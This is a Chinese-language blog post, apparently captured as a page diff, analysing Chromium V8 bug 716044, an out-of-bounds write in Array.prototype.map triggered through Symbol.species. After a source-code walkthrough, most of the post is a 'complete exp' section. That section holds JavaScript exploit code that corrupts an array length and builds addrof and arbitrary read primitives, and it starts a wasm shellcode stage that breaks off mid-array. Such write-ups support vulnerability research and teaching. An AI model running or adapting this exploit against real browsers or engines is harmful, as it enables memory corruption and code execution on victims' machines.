@@ -1,0 +1,835 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+    
+    
+    <link href="https://fonts.loli.net/css?family=Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic|Comic Neue:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="v8_exploit,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ditto's blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="Issue 716044: V8: OOB write in Array.prototype.map builtinhttps://bugs.chromium.org/p/chromium/issues/detail?id=716044">
+<meta name="keywords" content="v8_exploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chrome_v8_716044 Array.prototype.map OOB write">
+<meta property="og:url" content="http://yoursite.com/2019/11/04/Chrome-v8-716044-Array-prototype-map-OOB-write/index.html">
+<meta property="og:site_name" content="ditto&#39;s blog">
+<meta property="og:description" content="Issue 716044: V8: OOB write in Array.prototype.map builtinhttps://bugs.chromium.org/p/chromium/issues/detail?id=716044">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2019/11/04/Chrome-v8-716044-Array-prototype-map-OOB-write/1.png">
+<meta property="og:updated_time" content="2019-11-04T12:24:40.703Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Chrome_v8_716044 Array.prototype.map OOB write">
+<meta name="twitter:description" content="Issue 716044: V8: OOB write in Array.prototype.map builtinhttps://bugs.chromium.org/p/chromium/issues/detail?id=716044">
+<meta name="twitter:image" content="http://yoursite.com/2019/11/04/Chrome-v8-716044-Array-prototype-map-OOB-write/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/11/04/Chrome-v8-716044-Array-prototype-map-OOB-write/">
+
+
+
+
+
+  <title>Chrome_v8_716044 Array.prototype.map OOB write | ditto's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ditto's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/04/Chrome-v8-716044-Array-prototype-map-OOB-write/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ditto">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/my.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ditto's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Chrome_v8_716044 Array.prototype.map OOB write</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-04T19:44:33+08:00">
+                2019-11-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  7
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>Issue 716044: V8: OOB write in Array.prototype.map builtin<br><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=716044" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=716044</a><br><a id="more"></a></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>作者的博客<br><a href="https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/" target="_blank" rel="noopener">https://halbecaf.com/2017/05/24/exploiting-a-v8-oob-write/</a></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞出在CSA builtin函数Array.map中<br>在builtins-array-gen.cc可以找到其实现。<br>主调用链如下:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">TF_BUILTIN(ArrayMap, ArrayBuiltinCodeStubAssembler)</span><br><span class="line">    -&gt; Node* receiver = args.GetReceiver(); <span class="regexp">//</span>获得this</span><br><span class="line">    -&gt; Node* callbackfn = args.GetOptionalArgumentValue(<span class="number">0</span>, UndefinedConstant()); <span class="regexp">//</span>获得callback function </span><br><span class="line">    -&gt; Node* this_arg = args.GetOptionalArgumentValue(<span class="number">1</span>, UndefinedConstant()); <span class="regexp">//</span> callback_func this_arg</span><br><span class="line">    -&gt; InitIteratingArrayBuiltinBody(context, receiver, callbackfn, this_arg,new_target, argc)</span><br><span class="line">    -&gt; GenerateIteratingArrayBuiltinBody( <span class="regexp">//</span>实现</span><br><span class="line">      <span class="string">"Array.prototype.map"</span>, &amp;ArrayBuiltinCodeStubAssembler::MapResultGenerator,</span><br><span class="line">      &amp;ArrayBuiltinCodeStubAssembler::MapProcessor,</span><br><span class="line">      &amp;ArrayBuiltinCodeStubAssembler::NullPostLoopAction,</span><br><span class="line">      Builtins::CallableFor(isolate(), Builtins::kArrayMapLoopContinuation));</span><br></pre></td></tr></table></figure></p>
+<p>GenerateIteratingArrayBuiltinBody的实现如下:<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">void GenerateIteratingArrayBuiltinBody(</span><br><span class="line">    <span class="keyword">const</span> char* name, <span class="keyword">const</span> BuiltinResultGenerator&amp; generator,</span><br><span class="line">    <span class="keyword">const</span> CallResultProcessor&amp; processor, <span class="keyword">const</span> PostLoopAction&amp; action,</span><br><span class="line">    <span class="keyword">const</span> Callable&amp; slow_case_continuation,</span><br><span class="line">    ForEachDirection direction = ForEachDirection::kForward) &#123;</span><br><span class="line">  Label non_array(<span class="keyword">this</span>), slow(<span class="keyword">this</span>, &#123;&amp;k_, &amp;a_, &amp;to_&#125;),</span><br><span class="line">      array_changes(<span class="keyword">this</span>, &#123;&amp;k_, &amp;a_, &amp;to_&#125;);</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 1. Let O be ToObject(this value).</span></span><br><span class="line">  <span class="comment">// 2. ReturnIfAbrupt(O)</span></span><br><span class="line">  o_ = CallStub(CodeFactory::ToObject(isolate()), context(), receiver());<span class="comment">//this</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3. Let len be ToLength(Get(O, "length")).</span></span><br><span class="line">  <span class="comment">// 4. ReturnIfAbrupt(len).</span></span><br><span class="line">  VARIABLE(merged_length, MachineRepresentation::kTagged);</span><br><span class="line">  Label has_length(<span class="keyword">this</span>, &amp;merged_length), not_js_array(<span class="keyword">this</span>);</span><br><span class="line">  GotoIf(DoesntHaveInstanceType(o(), JS_ARRAY_TYPE), &amp;not_js_array);</span><br><span class="line">  merged_length.Bind(LoadJSArrayLength(o()));<span class="comment">// this array length </span></span><br><span class="line">  Goto(&amp;has_length);</span><br><span class="line">  ...</span><br><span class="line">  BIND(&amp;has_length);</span><br><span class="line">  len_ = merged_length.value();</span><br><span class="line">  ...</span><br><span class="line">  a_.Bind(generator(<span class="keyword">this</span>)); <span class="comment">// 以o_创建衍生对象，该对象作为map函数返回的对象</span></span><br><span class="line">  HandleFastElements(processor, action, &amp;slow, direction);</span><br><span class="line">  ...</span><br><span class="line">  Node* result =</span><br><span class="line">      CallStub(slow_case_continuation, context(), receiver(), callbackfn(),</span><br><span class="line">               this_arg(), a_.value(), o(), k_.value(), len(), to_.value());</span><br><span class="line">  ReturnFromBuiltin(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里 **o_ = this Array , len_ = this Array的长度 , a_  = 衍生对象<br>根据 <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=716044" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=716044</a> 可得知<code>a_.Bind(generator(this))</code>存在问题.<br>generator这里是<code>MapResultGenerator</code>，这里直接调用了<code>ArraySpeciesCreate(context(), o(), len_)</code><br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Node</span><span class="title">* MapResultGenerator</span>() &#123;</span><br><span class="line">  // <span class="number">5</span>. Let A be ? ArraySpeciesCreate(O, len).</span><br><span class="line">  return ArraySpeciesCreate(context(), o(), len_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>而ArraySpeciesCreate调用了<code>Object::ArraySpeciesConstructor</code><br><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Node</span><span class="title">* CodeStubAssembler</span>::ArraySpeciesCreate(<span class="keyword">Node</span><span class="title">* context</span>, <span class="keyword">Node</span><span class="title">* originalArray</span>,</span><br><span class="line">                                            <span class="keyword">Node</span><span class="title">* len</span>) &#123;</span><br><span class="line">  // TODO(mvstanton): Install a fast path as well, which avoids the runtime</span><br><span class="line">  // call.</span><br><span class="line">  <span class="keyword">Node</span><span class="title">* constructor</span> =</span><br><span class="line">      CallRuntime(Runtime::kArraySpeciesConstructor, context, originalArray);// MaybeHandle<span class="tag">&lt;Object&gt;</span> Object::ArraySpeciesConstructor(</span><br><span class="line">  return ConstructJS(CodeFactory::Construct(isolate()), context, constructor,</span><br><span class="line">                     len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>ArraySpeciesConstructor这个函数会找到this对象的[Symbol.species]属性，以该属性返回的函数当做构造函数.</p>
+<p>通过查阅资料(<a href="http://es6.ruanyifeng.com/#docs/symbol#)得知" target="_blank" rel="noopener">http://es6.ruanyifeng.com/#docs/symbol#)得知</a>:<br>Symbol.species<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyArray</span> <span class="keyword">extends</span> <span class="title">Array</span> </span>&#123;</span><br><span class="line">  static get [<span class="type">Symbol</span>.species]() &#123; <span class="keyword">return</span> <span class="type">Array</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这时候再创建MyArray的衍生对象就将 Symbol.species返回的函数当做构造函数(constructor)<br>什么是衍生对象？<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyArray</span> <span class="keyword">extends</span> <span class="title">Array</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">get</span> [Symbol.species]() &#123; <span class="keyword">return</span> <span class="built_in">Array</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> a = <span class="keyword">new</span> MyArray();</span><br><span class="line"><span class="keyword">const</span> b = a.map(<span class="function"><span class="params">x</span> =&gt;</span> x);</span><br><span class="line">b <span class="keyword">instanceof</span> MyArray <span class="comment">// false</span></span><br><span class="line">b <span class="keyword">instanceof</span> <span class="built_in">Array</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p>
+<p>这里生成的对象b就是衍生对象. Symbol.species的作用在于，实例对象在运行过程中，需要再次调用自身的构造函数时，会调用Symbol.species返回的构造函数<br>注意new一个MyArray对象的时候不会调用Symbol.species指定的构造函数</p>
+<p>默认情况下[Symbol.species]属性是像下面这样的:<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">static get [<span class="string">Symbol.species</span>](<span class="link"></span>) &#123;</span><br><span class="line">  return this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里调用map的对象是Array，则this即是Array.<br>而我们可以写一个子类继承自Array.创建一个[Symbol.species]属性，该函数返回另一个我们创建的类，该类继承自Array，这里我们可以修改此类的构造函数，生成一个length自定义的Array. 控制该Array的length小于this Array即可OOB write.</p>
+<h3 id="获得一个OOB-Array"><a href="#获得一个OOB-Array" class="headerlink" title="获得一个OOB Array"></a>获得一个OOB Array</h3><p>利用越界写，修改一个Array的length属性，得到一个可以越界写的Array，然后得到addrof，read,write原语，写入shellcode即可。<br><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">let oob_array ;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Array1</span> <span class="keyword">extends</span> <span class="title">Array</span> </span>&#123;</span><br><span class="line">  constructor(len) &#123;</span><br><span class="line">    <span class="keyword">super</span>(<span class="number">1</span>);</span><br><span class="line">    oob_array = <span class="keyword">new</span> <span class="type">Array</span>(<span class="number">1.1</span>, <span class="number">1.1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyArray</span> <span class="keyword">extends</span> <span class="title">Array</span> </span>&#123;</span><br><span class="line">  static get [<span class="type">Symbol</span>.species]() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="type">Array1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">let myarray = <span class="keyword">new</span> <span class="type">MyArray</span>();</span><br><span class="line">myarray.length = <span class="number">9</span>;</span><br><span class="line">myarray[<span class="number">4</span>] = <span class="number">42</span>;</span><br><span class="line">myarray[<span class="number">8</span>] = <span class="number">42</span>;</span><br><span class="line">let a = myarray.map(function(x) &#123; <span class="keyword">return</span> <span class="number">10000</span>; &#125;);</span><br></pre></td></tr></table></figure></p>
+<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">convert</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.buf=<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">this</span>.uint8array=<span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.float64array=<span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">        <span class="keyword">this</span>.uint32array=<span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="keyword">this</span>.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2i(x)<span class="comment">//float64 ==&gt; uint64</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.float64array[<span class="number">0</span>]=x;</span><br><span class="line">        <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span> ;i&lt; <span class="number">8</span> ;i ++)</span><br><span class="line">            sum += <span class="keyword">this</span>.uint8array[i]*(<span class="number">0x100</span>**i);</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">    i2f(x)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">let</span> tmp = [];</span><br><span class="line">        tmp[<span class="number">0</span>] = (x % <span class="number">0x100000000</span>);</span><br><span class="line">        tmp[<span class="number">1</span>] = ((x - tmp[<span class="number">0</span>]) / <span class="number">0x100000000</span>);</span><br><span class="line">        <span class="keyword">this</span>.uint32array[<span class="number">0</span>]=tmp[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">this</span>.uint32array[<span class="number">1</span>]=tmp[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.float64array[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> conv = <span class="keyword">new</span> convert();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>) </span>&#123; <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123; <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000000</span>); &#125; &#125;</span><br><span class="line"><span class="keyword">let</span> oob_array ;</span><br><span class="line"><span class="keyword">let</span> obj_array ; </span><br><span class="line"><span class="keyword">let</span> buf ;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Array1</span> <span class="keyword">extends</span> <span class="title">Array</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span>(len) &#123;</span><br><span class="line">    <span class="keyword">super</span>(<span class="number">1</span>);</span><br><span class="line">    oob_array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1.1</span>, <span class="number">1.1</span>);</span><br><span class="line">    obj_array = [&#123;<span class="string">"a"</span>:<span class="number">0x414141</span>,<span class="string">"b"</span>:&#123;&#125;&#125;];</span><br><span class="line">    buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x91</span>);</span><br><span class="line">    <span class="comment">//%DebugPrint(obj_array);</span></span><br><span class="line">    <span class="comment">//%DebugPrint(buf);</span></span><br><span class="line">    <span class="comment">//%SystemBreak();</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyArray</span> <span class="keyword">extends</span> <span class="title">Array</span> </span>&#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">get</span> [Symbol.species]() &#123;</span><br><span class="line">    <span class="keyword">return</span> Array1;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> myarray = <span class="keyword">new</span> MyArray();</span><br><span class="line">myarray.length = <span class="number">9</span>;</span><br><span class="line">myarray[<span class="number">4</span>] = <span class="number">42</span>;</span><br><span class="line">myarray[<span class="number">8</span>] = <span class="number">42</span>;</span><br><span class="line"><span class="keyword">let</span> a = myarray.map(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123; <span class="keyword">return</span> <span class="number">10000</span>; &#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj_offset ;</span><br><span class="line"><span class="keyword">let</span> buf_offset ;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; <span class="number">0x1000</span> ; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(conv.f2i(oob_array[i]) == <span class="number">0x41414100000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        obj_offset = i+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span> ; i &lt; <span class="number">0x1000</span> ; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(conv.f2i(oob_array[i]) == <span class="number">0x9100000000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        buf_offset = i+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addrof</span>(<span class="params">obj</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>].b = obj;</span><br><span class="line">    <span class="keyword">return</span> conv.f2i(oob_array[obj_offset]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    oob_array[buf_offset] = conv.i2f(addr);</span><br><span class="line">    <span class="keyword">let</span> uint8array = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buf);</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span> ;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span> ;i&lt; <span class="number">8</span> ;i ++)</span><br><span class="line">            sum += uint8array[i]*(<span class="number">0x100</span>**i);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span 